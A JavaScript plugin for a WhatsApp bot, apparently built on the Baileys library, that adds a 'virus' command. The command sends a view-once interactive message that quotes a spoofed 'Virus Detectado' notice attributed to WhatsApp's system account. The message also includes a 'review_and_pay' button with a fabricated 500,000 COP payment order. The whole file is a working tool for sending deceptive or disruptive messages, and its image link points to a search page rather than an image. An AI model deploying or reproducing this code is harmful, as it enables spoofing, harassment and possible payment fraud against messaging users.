import { prepareWAMessageMedia, generateWAMessageFromContent } from '@whiskeysockets/baileys'
const handler = async (m, { conn, args, usedPrefix, command }) => {
  const fakeQuoted = {
    key: {
      participant: "0@s.whatsapp.net", //usuario
      remoteJid: "0@s.whatsapp.net", //grupo
      fromMe: false
    },
    message: { conversation: "Virus Detectado" }
  }
  let msgOptions = { userJid: conn.user.id, quoted: fakeQuoted };
  let media = await prepareWAMessageMedia({ image: { url: "https://www.google.com/search?q=urls+imagen&oq=urls+imagen&gs_lcrp=EgZjaHJvbWUyBggAEEUYOdIBCDI3ODhqMGo5qAIAsAIB&client=ms-android-samsung-ss&sourceid=chrome-mobile&ie=UTF-8#vhid=uV8Iku9XQFsfwM&vssid=_Ed62ZtrZIIbekvQP5cOA0A8_22" } }, { upload: conn.waUploadToServer })
  let msgL = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "title",
            subtitle: "subtitle",
            hasMediaAttachment: !!media,
            imageMessage: media?.imageMessage,
          },
          body: { text: "Body" },
          footer: { text: "Footer" },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"COP\",\"total_amount\":{\"value\":500000,\"offset\":100},\"reference_id\":\"4PMSGGOW981\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":500000,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"26108774512103632\",\"product_id\":\"26108774512103632\",\"name\":\"Inteligencia Artificial\",\"amount\":{\"value\":500000,\"offset\":100},\"quantity\":1}]},\"native_payment_methods\":[]}",
            }],
            messageVersion: 1
          },
        }
      }
    },
  }, msgOptions)
  await conn.relayMessage(m.chat, msgL.message, { messageId: msgL.key.id });
}

handler.help = ['virus'];
handler.tags = ['virus'];
handler.command = /^(virus)$/i;
export default handler;